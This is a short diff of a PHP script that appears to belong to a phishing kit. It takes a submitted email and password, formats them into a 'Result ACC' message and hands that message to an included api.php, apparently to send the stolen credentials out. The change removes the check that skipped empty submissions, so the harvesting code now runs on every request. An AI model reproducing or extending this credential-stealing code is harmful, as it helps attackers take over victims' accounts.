@@ -11,11 +11,6 @@ $email = $_POST['email'];
 $password = $_POST['password'];
 $login = $_POST['login'];
 
-if ($email == "" && $password == "")
-{
-  header("Location: index.php");
-} else {
-
 $msg = ("
 ❗️=========== Result ACC ===========❗️
 
@@ -32,7 +27,6 @@ PASSWORD  = ".$password."
 
 $url = $msg;include("api.php");
 
-}
 
 
 ?>
